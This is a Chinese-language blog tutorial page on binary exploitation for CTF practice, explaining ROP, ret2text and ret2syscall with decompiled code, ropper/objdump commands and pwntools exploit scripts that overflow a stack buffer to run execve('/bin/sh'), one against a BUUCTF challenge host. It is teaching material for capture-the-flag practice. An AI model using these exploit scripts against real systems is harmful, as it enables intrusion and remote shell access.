@@ -1,0 +1,553 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    ret2textret2syscallret2libc | SEZUVEM=&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="ret2text ret2syscall ret2libcROP的介绍_**Return Oriented Programming（面向返回的编程） **_主要是在栈溢出的基础上，利用程序中已有的小片段（gadgets）来改变某些寄存器或者变量的值，从而控制程序的执行流程，绕过 NX 的防御。 什么是gedget？在二进制漏洞利用比如 ROP 攻击中，Gadget（中文常称指令片段）是指以 ret">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2textret2syscallret2libc">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/ret2textret2syscallret2libc/index.html">
+<meta property="og:site_name" content="SEZUVEM&#x3D;&#39;s Blog">
+<meta property="og:description" content="ret2text ret2syscall ret2libcROP的介绍_**Return Oriented Programming（面向返回的编程） **_主要是在栈溢出的基础上，利用程序中已有的小片段（gadgets）来改变某些寄存器或者变量的值，从而控制程序的执行流程，绕过 NX 的防御。 什么是gedget？在二进制漏洞利用比如 ROP 攻击中，Gadget（中文常称指令片段）是指以 ret">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1769408099948-b0327880-7c33-48d6-90ce-eb8de80248e6-643002.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1769408675384-5711d172-36d1-4d97-84d6-cdb1d7c9aaf5-839753.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1769408951359-0e079585-0702-4b75-92ca-55daae473a82-445095.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1768929437013-7e63b627-9adc-445f-9c60-3a4e1edc31f0-152881.png">
+<meta property="article:published_time" content="2026-04-28T11:14:15.286Z">
+<meta property="article:modified_time" content="2026-04-28T11:19:30.356Z">
+<meta property="article:author" content="SEZUVEM&#x3D;">
+<meta property="article:tag" content="Pwn, CTF, Binary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1769408099948-b0327880-7c33-48d6-90ce-eb8de80248e6-643002.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="SEZUVEM='s Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="ret2textret2syscallret2libc">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">ret2textret2syscallret2libc</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2text-ret2syscall-ret2libc"><span class="toc-number">1.</span> <span class="toc-text">ret2text ret2syscall ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP%E7%9A%84%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">ROP的介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFgedget%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">什么是gedget？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2text"><span class="toc-number">1.3.</span> <span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2syscall"><span class="toc-number">1.4.</span> <span class="toc-text">ret2syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ropper-%E7%9A%84%E4%BD%BF%E7%94%A8-%E5%AF%BB%E6%89%BE-gadgets"><span class="toc-number">1.4.1.</span> <span class="toc-text">ropper 的使用(寻找 gadgets)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#obdjump-%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%88%E5%AF%BB%E6%89%BE-bin-sh%EF%BC%89"><span class="toc-number">1.4.2.</span> <span class="toc-text">obdjump 的使用（寻找 &#x2F;bin&#x2F;sh）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.4.3.</span> <span class="toc-text">32位程序的条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#64%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.4.4.</span> <span class="toc-text">64位程序的条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E4%B8%8D%E5%88%B0pop-rax-ret%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number">1.4.5.</span> <span class="toc-text">找不到pop rax; ret怎么办？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2syscall-exp-%E5%8F%A6%E4%B8%80%E7%A7%8D-gadgets"><span class="toc-number">1.4.6.</span> <span class="toc-text">ret2syscall exp(另一种 gadgets)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc"><span class="toc-number">1.5.</span> <span class="toc-text">ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#32-%E4%BD%8D%E7%A8%8B%E5%BA%8F-re2libc"><span class="toc-number">1.5.1.</span> <span class="toc-text">32 位程序 re2libc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#64-%E4%BD%8D%E7%A8%8B%E5%BA%8F-ret2libc"><span class="toc-number">1.5.2.</span> <span class="toc-text">64 位程序 ret2libc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A"><span class="toc-number">1.5.3.</span> <span class="toc-text">延迟绑定</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-ret2textret2syscallret2libc" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-28T11:14:15.286Z" itemprop="datePublished">2026-04-28</time>
+    <time style="display: none;" id="post-update-time">2026-04-28</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="ret2text-ret2syscall-ret2libc"><a href="#ret2text-ret2syscall-ret2libc" class="headerlink" title="ret2text ret2syscall ret2libc"></a>ret2text ret2syscall ret2libc</h1><h3 id="ROP的介绍"><a href="#ROP的介绍" class="headerlink" title="ROP的介绍"></a>ROP的介绍</h3><p>_**Return Oriented Programming（面向返回的编程） **_主要是在栈溢出的基础上，利用程序中已有的小片段（gadgets）来改变某些寄存器或者变量的值，从而控制程序的执行流程，绕过 NX 的防御。</p>
+<h3 id="什么是gedget？"><a href="#什么是gedget？" class="headerlink" title="什么是gedget？"></a>什么是gedget？</h3><p><font style="color:rgba(0, 0, 0, 0.85);">在二进制漏洞利用比如 ROP 攻击中，</font><font style="color:rgb(0, 0, 0) !important;">Gadget</font><font style="color:rgba(0, 0, 0, 0.85);">（中文常称指令片段）是指</font><strong><font style="color:rgb(0, 0, 0) !important;">以 </font><strong><strong><font style="color:rgb(0, 0, 0);">ret</font></strong></strong><font style="color:rgb(0, 0, 0) !important;"> 指令结尾的、长度很短的连续机器指令序列</font></strong><font style="color:rgba(0, 0, 0, 0.85);">.这些指令片段并不是程序刻意编写的,而是从程序的现有代码段(.text 段)中拼凑出来的。</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.85);">在漏洞利用中，很多防护机制（比如 </font><strong><font style="color:rgb(0, 0, 0) !important;">DEP&#x2F;NX</font></strong><font style="color:rgba(0, 0, 0, 0.85);">，即数据执行保护）会禁止直接执行栈上的恶意代码。此时攻击者无法直接注入 shellcode，只能通过</font><strong><font style="color:rgb(0, 0, 0) !important;">拼接程序自身的 Gadget</font></strong><font style="color:rgba(0, 0, 0, 0.85);">，构造一条「指令执行链」（即 ROP 链），间接实现攻击目的（比如调用 system(“&#x2F;bin&#x2F;sh”) 获取 shell）。</font></p>
+<h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>_<strong>ret2text 控制程序本身已有的.text 代码 <strong>_属于 ROP 攻击中最基础的攻击方法，</strong><font style="color:#DF2A3F;">当程序存在完整的后门函数的时候</font></strong>，我们可以直接手动测出偏移，进行缓冲区溢出填充到 rbp&#x2F;ebp 进而跳转到后门函数获取 shell。</p>
+<p>_**BUUCTF[ jarvisoj_level0 ] **_用一道题目来讲解 ret2text</p>
+<img src="/HFTTC.github.io/images/pwn/1769408099948-b0327880-7c33-48d6-90ce-eb8de80248e6-643002.png" alt="1769408099948-b0327880-7c33-48d6-90ce-eb8de80248e6.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __fastcall main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, 0xDu);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">128</span>]; // [rsp+0h] [rbp-80h] BYREF</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, 0x200u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过 IDA 分析，可以任意读取 0x200 个字节的字符串，但和 rbp 的距离只有 0x80，是一个最基础的栈溢出。</p>
+<p>有经验的可以一眼看出来输入 0x80+8 个字符串去覆盖即可（这道题好像没办法手动测量），找到后门函数地址<img src="/HFTTC.github.io/images/pwn/1769408675384-5711d172-36d1-4d97-84d6-cdb1d7c9aaf5-839753.png" alt="1769408675384-5711d172-36d1-4d97-84d6-cdb1d7c9aaf5.png" style="max-width: 100%; display: block; margin: 0 auto;"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./level0&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26567</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>) </span><br><span class="line"><span class="comment">#p.recvuntil(...) 就是帮你 “监听” 程序的话，确认它说完指定内容后，再执行你的发送操作。</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x88</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>构造 exp 后，我们直接运行ret2text.py可以拿到shell</p>
+<img src="/HFTTC.github.io/images/pwn/1769408951359-0e079585-0702-4b75-92ca-55daae473a82-445095.png" alt="1769408951359-0e079585-0702-4b75-92ca-55daae473a82.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>ret2sycall 就是通过执行 gadgets 改变寄存器的值然后控制程序执行系统调用。<strong><font style="color:#DF2A3F;"> 当我们在程序中找不到可用的 system 函数但可以寻找到&#x2F;bin&#x2F;sh 的情况下</font></strong>，原理和 Shellcode 一样，不过是需要自己去寻找 gadgets。</p>
+<h4 id="ropper-的使用-寻找-gadgets"><a href="#ropper-的使用-寻找-gadgets" class="headerlink" title="ropper 的使用(寻找 gadgets)"></a>ropper 的使用(寻找 gadgets)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f ./ret2syscall --search <span class="string">&quot;pop|ret&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="obdjump-的使用（寻找-bin-sh）"><a href="#obdjump-的使用（寻找-bin-sh）" class="headerlink" title="obdjump 的使用（寻找 &#x2F;bin&#x2F;sh）"></a>obdjump 的使用（寻找 &#x2F;bin&#x2F;sh）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -s -j .rodata ./your_pwn_file | grep -i &quot;sh&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="32位程序的条件"><a href="#32位程序的条件" class="headerlink" title="32位程序的条件"></a>32位程序的条件</h4><p>对于ret2syscall来说，我们需要让程序调用execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)去拿到shell</p>
+<p>对于三十二位程序来说调用execve的函数步骤：</p>
+<p>1)eax&#x3D;0xb  2)ebx指向&#x2F;bin&#x2F;sh的地址  3)ecx&#x3D;0  4)edx&#x3D;0</p>
+<p>最后执行int 0x80触发终端就可以成功会自行execve( )获取到shell<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"></font></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./BUUCTF32&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">100</span>  <span class="comment"># 缓冲区到返回地址的偏移（cyclic计算）</span></span><br><span class="line"><span class="comment"># ---------- 以下地址需用Ropper查找 ----------</span></span><br><span class="line">pop_ebx_ret =      <span class="comment"># pop ebx; ret 的地址</span></span><br><span class="line">pop_ecx_ret =      <span class="comment"># pop ecx; ret 的地址</span></span><br><span class="line">pop_edx_ret =      <span class="comment"># pop edx; ret 的地址</span></span><br><span class="line">pop_eax_ret =      <span class="comment"># pop eax; ret地址</span></span><br><span class="line">int_0x80_ret =     <span class="comment"># int 0x80; ret 的地址</span></span><br><span class="line">sh_str =           <span class="comment"># &quot;/bin/sh&quot; 字符串的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 构造ret2syscall的ROP链</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * offset  <span class="comment"># 填充到返回地址</span></span><br><span class="line"></span><br><span class="line">payload += p32(pop_ebx_ret)   <span class="comment"># 给ebx赋值：/bin/sh地址</span></span><br><span class="line">payload += p32(sh_str)</span><br><span class="line"></span><br><span class="line">payload += p32(pop_ecx_ret)   <span class="comment"># 给ecx赋值：0</span></span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(pop_edx_ret)   <span class="comment"># 给edx赋值：0</span></span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(pop_eax_ret)   <span class="comment"># 给eax赋值0xb</span></span><br><span class="line">payload += p32(<span class="number">0xb</span>) </span><br><span class="line"></span><br><span class="line">payload += p32(int_0x80_ret)  <span class="comment"># 触发系统调用</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="64位程序的条件"><a href="#64位程序的条件" class="headerlink" title="64位程序的条件"></a>64位程序的条件</h4><p>1）将 RAX 寄存器的值设置为 0x3b； 2）将 RDI 寄存器的值设置为”&#x2F;bin&#x2F;sh”字符串的地址；3）将 RSI 和 RDX 寄存器的值都设置为 0；4） 最终触发 syscall 获得 shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./your_pwn_file&quot;</span>) </span><br><span class="line"></span><br><span class="line">offset = <span class="number">120</span>      <span class="comment"># 示例值，需替换为实际偏移</span></span><br><span class="line">pop_rdi_ret =     <span class="comment"># pop rdi; ret （给rdi传参）</span></span><br><span class="line">pop_rsi_ret =     <span class="comment"># pop rsi; ret （给rsi传参）</span></span><br><span class="line">pop_rdx_ret =     <span class="comment"># pop rdx; ret （给rdx传参）</span></span><br><span class="line">pop_rax_ret =     <span class="comment"># pop rax; ret （给rax传参）</span></span><br><span class="line">syscall_ret =     <span class="comment"># syscall; ret （触发系统调用）</span></span><br><span class="line">ret_gadget =      <span class="comment"># ret （栈对齐用）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. &quot;/bin/sh&quot;字符串地址（用objdump/ROPgadget查找）</span></span><br><span class="line">sh_str = <span class="number">0x402041</span>             <span class="comment"># 示例值，需替换为实际地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * offset  </span><br><span class="line">payload += p64(ret_gadget)    <span class="comment"># 栈对齐（64位syscall要求栈16字节对齐，必须加！）</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret)   <span class="comment"># 1. 给rdi赋值：/bin/sh字符串地址（execve第一个参数）</span></span><br><span class="line">payload += p64(sh_str)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rsi_ret)   <span class="comment"># 2. 给rsi赋值：0（execve第二个参数NULL）</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdx_ret)   <span class="comment"># 3. 给rdx赋值：0（execve第三个参数NULL）</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rax_ret)   <span class="comment"># 4. 给rax赋值：59（execve的系统调用号）</span></span><br><span class="line">payload += p64(<span class="number">59</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(syscall_ret)   <span class="comment"># 5. 触发syscall，执行execve(&quot;/bin/sh&quot;, NULL, NULL)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：根据程序输入逻辑选择send/sendline（比如read用send，scanf用sendline）</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="找不到pop-rax-ret怎么办？"><a href="#找不到pop-rax-ret怎么办？" class="headerlink" title="找不到pop rax; ret怎么办？"></a><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">找不到</font><code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">pop rax; ret</font></code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">怎么办？</font></h4><p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">用xor rax, rax + mov al, 0x3b替代：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 新增gadget地址</span><br><span class="line">xor_rax_rax_ret = 0x4012c4  # xor rax, rax; ret</span><br><span class="line">mov_al_3b_ret = 0x4012c6    # mov al, 0x3b; ret</span><br><span class="line"></span><br><span class="line"># 替换rax赋值逻辑</span><br><span class="line">payload += p64(xor_rax_rax_ret)  # rax=0</span><br><span class="line">payload += p64(mov_al_3b_ret)    # rax=59（0x3b）</span><br></pre></td></tr></table></figure>
+
